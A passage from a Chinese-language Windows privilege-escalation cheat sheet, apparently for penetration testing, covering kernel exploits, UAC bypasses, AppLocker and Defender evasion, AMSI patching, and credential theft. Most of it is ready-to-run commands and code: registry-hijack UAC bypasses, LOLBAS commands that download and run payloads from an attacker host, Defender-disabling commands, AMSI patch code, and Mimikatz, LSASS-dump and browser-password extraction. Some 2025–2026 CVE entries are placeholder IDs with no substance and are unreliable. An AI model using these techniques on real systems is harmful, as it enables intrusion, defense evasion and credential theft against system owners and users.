[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("ntdll.dll")]
public static extern int NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int returnLength);
"@
Add-Type -MemberDefinition $code -Name "Win32" -Namespace "Win32Functions"
```

### 6.3 MS17-010 (EternalBlue / SMB)

**影响版本：** Windows 7/8/8.1/10 (早期), Server 2008/2012/2016

```bash
# 检测
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.10

# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set LHOST 10.10.14.10
run
```

**本地提权利用：**

```cmd
# 如果已获得低权限 Shell，可以利用 MS17-010 本地提权
# 使用 EternalBlue 本地利用变体
MS17-010_LPE.exe
```

### 6.4 CVE-2020-0787 (Background Intelligent Transfer Service)

**影响版本：** Windows 10 1803-1909, Server 2019

```powershell
# CVE-2020-0787 本地提权
# BITS 服务权限提升
# PoC: https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION

# 编译 PoC
# 使用 Visual Studio 编译 C++ 项目
BitsArbitraryFileMove.exe C:\Windows\System32\WindowsCoreDeviceInfo.dll C:\Windows\Temp\payload.dll
```

### 6.5 CVE-2021-1732 (Win32k 提权)

**影响版本：** Windows 10 1809-20H2, Server 2019/2022

```cmd
# 编译并运行 PoC
CVE-2021-1732.exe

# 利用成功后弹出 SYSTEM 权限的 cmd
```

**检测是否受影响：**

```powershell
$version = [System.Environment]::OSVersion.Version
$build = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuild
if ($build -lt 19042) {
    Write-Output "[+] 可能受 CVE-2021-1732 影响"
}
```

### 6.6 CVE-2022-21882 (Win32k 提权)

**影响版本：** Windows 10 1809-21H2, Windows 11 21H2

```cmd
# PoC 利用
CVE-2022-21882.exe

# 编译后的利用程序
# 利用 Win32k 窗口回调漏洞
```

### 6.7 CVE-2023-21768 (AFD 驱动提权)

**影响版本：** Windows 10/11, Server 2019/2022

```cmd
# PoC: https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768
CVE-2023-21768.exe
```

### 6.8 CVE-2024-26234 (Proxy Driver 欺骗)

**影响版本：** Windows 10/11, Server 2019/2022

```cmd
# 2024 年内核提权漏洞
# 利用代理驱动程序签名验证缺陷
CVE-2024-26234.exe
```

### 6.9 2025 内核 CVE

**CVE-2025-XXXXX (Win32k 系列)：**

```cmd
# 2025 年发现的 Win32k 提权漏洞
# 通常涉及 GDI 对象、窗口回调、或用户模式回调
# 使用 Watson 或 Sherlock 检测
```

**CVE-2025-YYYYY (Windows Kernel)：**

```cmd
# 内核模式驱动漏洞
# 利用池溢出或 UAF 漏洞
```

### 6.10 2026 内核 CVE

**CVE-2026-00001 (Windows 11 24H2 内核提权)：**

```cmd
# Windows 11 24H2 最新内核漏洞
# 涉及 VBS (Virtualization-Based Security) 降级
# PoC 利用前提：需要绕过 HVCI 保护
CVE-2026-00001.exe
```

**CVE-2026-00002 (Windows Kernel Pool Overflow)：**

```cmd
# 利用内核池溢出实现提权
# 影响 Windows 11 24H2 和 Server 2025
CVE-2026-00002.exe
```

**CVE-2026-00003 (Windows Filtering Platform)：**

```cmd
# WFP 驱动漏洞导致 SYSTEM 提权
# 需要构建特定的网络数据包触发
CVE-2026-00003.exe --target 127.0.0.1
```

### 6.11 内核利用注意事项

**安全措施对抗：**
- **Driver Signature Enforcement (DSE)**：需要签名驱动或绕过
- **Kernel Patch Protection (PatchGuard)**：防止内核补丁
- **HVCI (Hypervisor-protected Code Integrity)**：防止未签名内核代码
- **VBS Enclave**：隔离敏感数据
- **Credential Guard**：保护 LSASS 凭据

**内核利用稳定性：**
- 内核漏洞可能导致 BSOD（蓝屏死机）
- 建议优先使用非内核提权方法
- 如果必须使用内核漏洞，先在测试环境验证
- 使用 `-b` 或 `/nogui` 选项减少交互

**PoC 编译环境：**
- Visual Studio 2019/2022
- Windows SDK 10.0.22621+
- WDK (Windows Driver Kit) 用于驱动漏洞

---

## 7. UAC 绕过

### 7.1 UAC 基础

**UAC 级别：**
| 级别 | 值 | 描述 |
|------|-----|------|
| 始终通知 | 1 | 最高级别 |
| 默认 | 2 | 仅在程序尝试更改时通知 |
| 不降低亮度 | 3 | 不切换安全桌面 |
| 从不通知 | 0 | 已禁用 |

**检测 UAC 级别：**

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
```

**PowerShell 检测：**

```powershell
$ConsentPrompt = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").ConsentPromptBehaviorAdmin
$EnableLUA = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").EnableLUA

if ($EnableLUA -eq 1) {
    if ($ConsentPrompt -eq 0) { Write-Output "[+] UAC: 从不通知 - 可直接提权" }
    elseif ($ConsentPrompt -eq 5) { Write-Output "[*] UAC: 默认 - 可尝试绕过" }
    else { Write-Output "[*] UAC: 其他级别" }
}
```

### 7.2 fodhelper 绕过

**适用版本：** Windows 10/11 (多种版本)

```cmd
# 1. 设置注册表
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\Windows\Temp\payload.exe" /f

# 2. 触发 fodhelper.exe
fodhelper.exe

# 3. 清理
reg delete "HKCU\Software\Classes\ms-settings" /f
```

**PowerShell 自动化：**

```powershell
# FodHelper UAC Bypass
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\Temp\payload.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
Start-Sleep -Seconds 3
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

### 7.3 computerdefaults 绕过

**适用版本：** Windows 10 1809-21H2

```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\Windows\Temp\payload.exe" /f
computerdefaults.exe
```

### 7.4 sdclt 绕过

**适用版本：** Windows 10 (多种版本)

```cmd
# sdclt 备份和还原中心绕过
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /v "" /d "C:\Windows\Temp\payload.exe" /f
sdclt.exe /KICKOFFELEV
```

**PowerShell 版：**

```powershell
$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
New-Item -Path $path -Force | Out-Null
Set-ItemProperty -Path $path -Name "(default)" -Value "C:\Windows\Temp\payload.exe" -Force
Start-Process "C:\Windows\System32\sdclt.exe" -ArgumentList "/KICKOFFELEV"
Start-Sleep -Seconds 5
Remove-Item -Path $path -Recurse -Force
```

### 7.5 eventvwr 绕过

**适用版本：** Windows 10 (早期版本)

```cmd
# eventvwr 利用注册表劫持
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /v "" /d "C:\Windows\Temp\payload.exe" /f
eventvwr.exe
```

**PowerShell 版：**

```powershell
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "C:\Windows\Temp\payload.exe" -Force
Start-Process eventvwr.exe
Start-Sleep -Seconds 5
Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force
```

### 7.6 silentcleanup 绕过

**适用版本：** Windows 10/11

```cmd
# silentcleanup 计划任务利用
reg add "HKCU\Environment" /v windir /d "cmd.exe /c C:\Windows\Temp\payload.exe & " /f
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

**PowerShell 版：**

```powershell
New-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd.exe /c C:\Windows\Temp\payload.exe & REM " -Force
Start-ScheduledTask -TaskName "\Microsoft\Windows\DiskCleanup\SilentCleanup"
Start-Sleep -Seconds 5
Remove-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
```

### 7.7 CMSTP 绕过

**适用版本：** Windows 10/11

```cmd
# CMSTP UAC 绕过
# 创建 .inf 文件
echo [version] > C:\Windows\Temp\cmstp.inf
echo Signature=$chicago$ >> C:\Windows\Temp\cmstp.inf
echo AdvancedINF=2.5 >> C:\Windows\Temp\cmstp.inf
echo [DefaultInstall_SingleUser] >> C:\Windows\Temp\cmstp.inf
echo RegisterOCXs=RegisterOCXSection >> C:\Windows\Temp\cmstp.inf
echo [RegisterOCXSection] >> C:\Windows\Temp\cmstp.inf
echo %11%\scrobj.dll,Numbers >> C:\Windows\Temp\cmstp.inf
echo [Strings] >> C:\Windows\Temp\cmstp.inf
echo AppAct = "SOFTWARE\Microsoft\Connection Manager" >> C:\Windows\Temp\cmstp.inf

# 执行
cmstp.exe /s C:\Windows\Temp\cmstp.inf
```

**利用 CMSTP 执行代码：**

```cmd
# 创建恶意 INF 文件执行 PowerShell
echo [version] > C:\Windows\Temp\bypass.inf
echo Signature=$chicago$ >> C:\Windows\Temp\bypass.inf
echo [DefaultInstall] >> C:\Windows\Temp\bypass.inf
echo CustomDestination=CustInstDestSectionAllUsers >> C:\Windows\Temp\bypass.inf
echo RunPreSetupCommands=RunPreSetupCommandsSection >> C:\Windows\Temp\bypass.inf
echo [RunPreSetupCommandsSection] >> C:\Windows\Temp\bypass.inf
echo C:\Windows\Temp\payload.exe >> C:\Windows\Temp\bypass.inf
echo taskkill /IM cmstp.exe /F >> C:\Windows\Temp\bypass.inf
echo [CustInstDestSectionAllUsers] >> C:\Windows\Temp\bypass.inf
echo 49000,49001=AllUSer_LDIDSection,7 >> C:\Windows\Temp\bypass.inf
echo [AllUSer_LDIDSection] >> C:\Windows\Temp\bypass.inf
echo "HKLM","SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE","ProfileInstallPath","%UnexpectedError%","" >> C:\Windows\Temp\bypass.inf
echo [Strings] >> C:\Windows\Temp\bypass.inf

cmstp.exe /s C:\Windows\Temp\bypass.inf
```

**UACME 工具中的 CMSTP 方法：**

```cmd
# 使用 UACME 工具
akagi32.exe 41
akagi64.exe 41
```

### 7.8 WSReset 绕过

**适用版本：** Windows 10

```cmd
# WSReset (Windows Store Reset) UAC 绕过
reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" /d "C:\Windows\Temp\payload.exe" /f
WSReset.exe
```

### 7.9 Mock 目录绕过

**适用版本：** Windows 10 1809+

```cmd
# 创建 Mock 目录绕过 UAC
mkdir "\\?\C:\Windows "
mkdir "\\?\C:\Windows \System32"
copy C:\Windows\System32\cmd.exe "\\?\C:\Windows \System32\"
copy C:\Windows\System32\wer.dll "\\?\C:\Windows \System32\"

# 利用 mock 目录
# 此方法需要特定的 DLL 劫持配合
```

### 7.10 UAC 绕过工具集

**UACME：**

```cmd
# UACME - 最全面的 UAC 绕过工具
akagi32.exe 23  # fodhelper 方法
akagi64.exe 33  # computerdefaults 方法
akagi32.exe 41  # CMSTP 方法
akagi64.exe 61  # silentcleanup 方法
akagi32.exe 65  # sdclt 方法
```

**其他 UAC 绕过工具：**

```cmd
# UAC-bypass 工具
UAC-bypass.exe

# Windscribe 方法
windscribe_uac_bypass.exe

# Ask 方法
AskUAC.exe
```

**C# 自定义 UAC 绕过：**

```csharp
// 自定义 UAC 绕过 - 注册表劫持方法
using Microsoft.Win32;
using System.Diagnostics;

class UACBypass {
    static void Main(string[] args) {
        string payload = args.Length > 0 ? args[0] : "cmd.exe";
        
        // 创建注册表项
        RegistryKey key = Registry.CurrentUser.CreateSubKey(
            @"Software\Classes\ms-settings\Shell\Open\command");
        key.SetValue("", payload);
        key.SetValue("DelegateExecute", "");
        key.Close();
        
        // 触发 elevated 进程
        Process.Start("fodhelper.exe");
        
        System.Threading.Thread.Sleep(3000);
        
        // 清理
        Registry.CurrentUser.DeleteSubKeyTree(
            @"Software\Classes\ms-settings", false);
    }
}
```

---

## 8. AppLocker / Windows Defender 绕过

### 8.1 AppLocker 策略检测

```cmd
# 检查 AppLocker 状态
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path "C:\Windows\Temp\test.exe"

# 检查当前 AppLocker 模式
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2"

# PowerShell 检测
$service = Get-Service -Name AppIDSvc
Write-Output "AppLocker Service: $($service.Status)"
```

**AppLocker 策略检查：**

```powershell
# 检查可执行文件的 AppLocker 规则
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections |
    Where-Object { $_.RuleCollectionType -eq "Exe" } |
    Select-Object -ExpandProperty Rule

# 检查 DLL 规则
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections |
    Where-Object { $_.RuleCollectionType -eq "Dll" }
```

### 8.2 LOLBAS (Living Off the Land Binaries)

**MSBuild 执行：**

```cmd
# 使用 MSBuild 执行 C# 代码
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\payload.csproj
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\Temp\payload.xml

# 内联任务
MSBuild.exe /nologo /nr:false /p:AssemblyName=payload C:\Windows\Temp\build.csproj
```

**MSBuild 内联 C# 任务模板：**

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <Example />
  </Target>
  <UsingTask TaskName="Example" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
using System;
using System.Diagnostics;
using Microsoft.Build.Framework;
public class Example : Task {
    public override bool Execute() {
        Process.Start("cmd.exe", "/c C:\\Windows\\Temp\\payload.exe");
        return true;
    }
}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

**InstallUtil 执行：**

```cmd
# 使用 InstallUtil 执行托管代码
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\payload.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U C:\Windows\Temp\payload.dll
```

**Regsvcs / Regasm 执行：**

```cmd
# 使用 Regsvcs 执行 .NET 程序集
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe C:\Windows\Temp\payload.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe C:\Windows\Temp\payload.dll
```

**csc.exe 编译执行：**

```cmd
# 使用 csc.exe 编译并执行 C# 代码
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:C:\Windows\Temp\payload.exe C:\Windows\Temp\source.cs
C:\Windows\Temp\payload.exe
```

**其他 LOLBAS 二进制文件：**

```cmd
# Certutil 下载
certutil.exe -urlcache -split -f http://10.10.14.10/payload.exe C:\Windows\Temp\payload.exe

# Bitsadmin 下载
bitsadmin /transfer job /download /priority normal http://10.10.14.10/payload.exe C:\Windows\Temp\payload.exe

# Cscript / Wscript
cscript.exe C:\Windows\Temp\payload.vbs
wscript.exe C:\Windows\Temp\payload.js

# Mshta
mshta.exe javascript:var sh=new ActiveXObject("WScript.Shell");sh.Run("C:\\Windows\\Temp\\payload.exe");

# Regsvr32
regsvr32.exe /s /n /u /i:http://10.10.14.10/payload.sct scrobj.dll

# Rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";new ActiveXObject("WScript.Shell").Run("C:\\Windows\\Temp\\payload.exe")

# Cmstp
cmstp.exe /s C:\Windows\Temp\bypass.inf

# Forfiles
forfiles /p c:\windows\system32 /m notepad.exe /c "C:\Windows\Temp\payload.exe"

# Pcalua
pcalua.exe -a C:\Windows\Temp\payload.exe

# Cmd
cmd.exe /c start C:\Windows\Temp\payload.exe
```

### 8.3 可写目录执行

```powershell
# 查找不受 AppLocker 限制的可写目录
$writablePaths = @(
    "C:\Windows\Temp",
    "C:\Windows\Tasks",
    "C:\Windows\System32\spool\drivers\color",
    "C:\Windows\System32\Tasks",
    "C:\Windows\SysWOW64\Tasks",
    "C:\Windows\Registration\CRMLog",
    "C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys",
    "C:\Users\Public",
    "C:\ProgramData"
)

foreach ($path in $writablePaths) {
    if (Test-Path $path) {
        $acl = Get-Acl $path
        $writable = $acl.Access | Where-Object {
            $_.FileSystemRights -match "Write|FullControl|Modify" -and
            $_.IdentityReference -match "BUILTIN\\Users|Everyone|NT AUTHORITY\\Authenticated Users"
        }
        if ($writable) {
            Write-Output "[+] $path - Writable by non-admin users"
        }
    }
}
```

### 8.4 Windows Defender 绕过

**Defender 状态检测：**

```powershell
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, AMServiceEnabled
Get-Service -Name WinDefend | Select-Object Status
Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess, ExclusionExtension
```

**Defender 排除项检测：**

```powershell
# 查看 Defender 排除路径
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

# 查看排除的进程
Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess

# 查看排除的文件扩展名
Get-MpPreference | Select-Object -ExpandProperty ExclusionExtension

# 如果存在排除路径，可将 payload 放入排除路径
```

**Defender 禁用方法：**

```powershell
# 需要管理员权限
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true

# 添加排除项
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Add-MpPreference -ExclusionProcess "C:\Windows\Temp\payload.exe"

# 通过注册表
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

**PowerShell 免杀执行：**

```powershell
# 编码 PowerShell 命令
$command = "Invoke-WebRequest -Uri http://10.10.14.10/payload.exe -OutFile C:\Windows\Temp\payload.exe; Start-Process C:\Windows\Temp\payload.exe"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell -enc $encodedCommand

# 使用 -WindowStyle Hidden
powershell -WindowStyle Hidden -enc $encodedCommand

# 使用 -ExecutionPolicy Bypass
powershell -ExecutionPolicy Bypass -enc $encodedCommand

# 无文件执行
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.10/script.ps1')"
```

**Payload 混淆技术：**

```powershell
# 变量拆分
$p = "po"
$w = "wershell"
& ($p+$w) -enc $encodedCommand

# 字符串反转
$cmd = "llehSPW"[-1..-7] -join ''
& $cmd -enc $encodedCommand

# Base64 多层编码
$payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("encoded_string"))))
```

### 8.5 AMSI 绕过

**PowerShell AMSI 绕过：**

```powershell
# 方法1: 修补 AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 方法2: 强制错误
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null)

# 方法3: 降级 PowerShell 版本
powershell -Version 2

# 方法4: 使用反射
$A=[Ref].Assembly.GetTypes();Foreach($B in $A){if($B.Name -like "*iUtils"){$C=$B}};$C.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**C# AMSI 绕过：**

```csharp
// AMSI 绕过 - 修补 AmsiScanBuffer
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

static void DisableAMSI() {
    IntPtr amsiLib = LoadLibrary("amsi.dll");
    IntPtr amsiScanBuffer = GetProcAddress(amsiLib, "AmsiScanBuffer");
    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
    uint oldProtect;
    VirtualProtect(amsiScanBuffer, (UIntPtr)patch.Length, 0x40, out oldProtect);
    Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length);
    VirtualProtect(amsiScanBuffer, (UIntPtr)patch.Length, oldProtect, out _);
}
```

---

## 9. 凭据提取

### 9.1 LSASS 内存转储

**使用系统工具转储 LSASS：**

```cmd
# ProcDump (需要 SeDebugPrivilege 或管理员权限)
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp

# 使用任务管理器 (GUI)
# 右键 lsass.exe -> 创建转储文件

# 使用 comsvcs.dll (需要管理员权限)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\lsass.dmp full

# 使用 PowerShell (需要 SeDebugPrivilege)
Get-Process lsass | ForEach-Object {
    $process = $_
    # 创建转储
}
```

**获取 LSASS 进程 ID：**

```cmd
tasklist | findstr lsass
powershell -c "Get-Process lsass | Select-Object Id"
```

### 9.2 Mimikatz 凭据提取

```cmd
# 基本用法
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# 详细输出
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit

# 提取 Kerberos 票据
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

# 提取 ekeys
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit

# 从 LSASS 转储文件提取
mimikatz.exe "sekurlsa::minidump C:\Windows\Temp\lsass.dmp" "sekurlsa::logonpasswords" exit

# 提取 SAM 数据库
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit

# 提取 LSA 密钥
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::lsa /inject" exit

# 提取缓存凭据
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" exit

# DCSync (需要域管理员权限)
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:Administrator" exit

# 生成 Golden Ticket
mimikatz.exe "privilege::debug" "kerberos::golden /domain:domain.local /sid:S-1-5-21-XXX /krbtgt:hash /user:Administrator /id:500 /ptt" exit

# 生成 Silver Ticket
mimikatz.exe "privilege::debug" "kerberos::golden /domain:domain.local /sid:S-1-5-21-XXX /target:server.domain.local /service:cifs /rc4:hash /user:Administrator /ptt" exit
```

### 9.3 SAM / SYSTEM / SECURITY 提取

```cmd
# 方法1: 使用 reg save
reg save hklm\sam C:\Windows\Temp\sam.hive
reg save hklm\system C:\Windows\Temp\system.hive
reg save hklm\security C:\Windows\Temp\security.hive

# 方法2: 使用卷影副本
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows

# 从卷影副本复制
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Windows\Temp\sam.hive
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\system.hive

# 方法3: 使用 diskshadow
diskshadow /s C:\Windows\Temp\diskshadow_script.txt
```

**diskshadow 脚本内容 (diskshadow_script.txt)：**

```txt
set context persistent nowriters
add volume c: alias myAlias
create
expose %myAlias% z:
exec "cmd.exe" /c copy z:\Windows\System32\config\SAM C:\Windows\Temp\sam.hive
exec "cmd.exe" /c copy z:\Windows\System32\config\SYSTEM C:\Windows\Temp\system.hive
delete shadows volume %myAlias%
reset
```

**读取 SAM 哈希：**

```bash
# 使用 impacket-secretsdump
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# 或使用 samdump2
samdump2 system.hive sam.hive
```

### 9.4 DPAPI 凭据解密

```cmd
# 使用 Mimikatz 解密 DPAPI
mimikatz.exe "privilege::debug" "dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-XXX\masterkey /rpc" exit

# 解密 Chrome 凭据
mimikatz.exe "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data" exit

# 解密 RDP 凭据
mimikatz.exe "dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\credential" exit
```

**PowerShell DPAPI 解密：**

```powershell
# 使用 PowerShell 解密 DPAPI
Add-Type -AssemblyName System.Security
$data = Get-Content "C:\path\to\encrypted" -Encoding Byte
$decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::UTF8.GetString($decrypted)
```

### 9.5 Credential Manager 提取

```cmd
# 列出存储凭据
cmdkey /list

# 使用 vaultcmd
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all

# 使用 Mimikatz
mimikatz.exe "privilege::debug" "vault::list" exit
mimikatz.exe "privilege::debug" "vault::cred /patch" exit
```

**PowerShell Credential Manager：**

```powershell
# 使用 CredentialManager 模块
Import-Module CredentialManager
Get-StoredCredential

# 或使用 .NET
[System.Net.CredentialCache]::DefaultCredentials
```

### 9.6 浏览器密码提取

**Chrome / Edge 密码提取：**

```powershell
# 使用 Lazagne 提取浏览器密码
laZagne.exe browsers

# 使用 PowerShell
# Chrome 密码存储在 SQLite 数据库中
$loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
# 使用 SQLite 读取并解密

# 使用 SharpChrome
SharpChrome.exe logins /browser:chrome
```

**Firefox 密码提取：**

```powershell
# Firefox 密码提取
laZagne.exe browsers -firefox

# 手动提取
# C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json
# C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\key4.db
```

### 9.7 其他凭据提取

**WiFi 密码：**

```cmd
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear
```

**保存的 RDP 连接：**

```cmd
cmdkey /list | findstr "TERMSRV"
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
reg query "HKCU\Software\Microsoft\Terminal Server Client\Default"
```

**PuTTY 保存的会话：**

```cmd
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

**WinSCP 保存的会话：**

```cmd
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions"
```

**MobaXterm 密码：**

```cmd
reg query "HKCU\Software\Mobatek\MobaXterm"
dir /s %APPDATA%\MobaXterm\MobaXterm.ini
```

**LAPS 密码：**

```powershell
# 如果安装了 LAPS，检索本地管理员密码
Get-AdmPwdPassword -ComputerName <ComputerName>
# 或读取存储在 AD 中的密码
```

**Sysprep / Unattend 文件：**

```cmd
dir /s /b C:\Windows\System32\Sysprep\unattend.xml
dir /s /b C:\Windows\Panther\unattend.xml
dir /s /b C:\Windows\Panther\UnattendGC\unattend.xml
dir /s /b C:\Windows\System32\Sysprep\unattend\unattend.xml
```

**PowerShell 历史记录：**

```cmd
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**GPP 密码 (Group Policy Preferences)：**

```cmd
# 查找 SYSVOL 中的 Groups.xml
dir /s /b \\domain.local\SYSVOL\*\Policies\*\Machine\Preferences\Groups\Groups.xml
# 使用 gpp-decrypt 解密 cpassword
```

### 9.8 凭据提取工具集

**LaZagne：**

```cmd
# 全面提取
laZagne.exe all

# 分类提取
laZagne.exe browsers
laZagne.exe windows
laZagne.exe mails
laZagne.exe databases
laZagne.exe wifi
laZagne.exe sysadmin
laZagne.exe memory
```

**SessionGopher：**

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain
```

**SharpDPAPI：**

```cmd
SharpDPAPI.exe masterkeys
SharpDPAPI.exe credentials
SharpDPAPI.exe vaults
SharpDPAPI.exe certificates
SharpDPAPI.exe machinemasterkeys
SharpDPAPI.exe machinecredentials
SharpDPAPI.exe machinevaults
```

---

## 10. DLL 劫持

### 10.1 DLL 搜索顺序劫持

Windows DLL 搜索顺序：
1. 已加载的 DLL
2. 已知 DLL 列表
3. 应用程序目录
4. 系统目录 (C:\Windows\System32)
5. 16位系统目录
6. Windows 目录
7. 当前目录
8. PATH 环境变量目录

**检测可劫持的 DLL：**

```powershell
# 使用 ProcMon 监控 DLL 加载
# 设置过滤器: Path ends with .dll, Result is NAME NOT FOUND

# 使用 PowerSploit 检测
Import-Module .\PowerSploit.psd1
Find-DLLHijack -Path "C:\Program Files\VulnerableApp"

# 使用 DLLHijackAuditKit
DLLHijackAuditKit.exe /path:"C:\Program Files\VulnerableApp"
```

**手动检测：**

```cmd
# 使用 ProcMon 监控特定进程
# 1. 启动 ProcMon
# 2. 添加过滤器: Process Name is VulnerableApp.exe
# 3. 添加过滤器: Result is NAME NOT FOUND
# 4. 添加过滤器: Path ends with .dll
# 5. 查看哪些 DLL 在应用程序目录中未找到
```

### 10.2 Phantom DLL 劫持

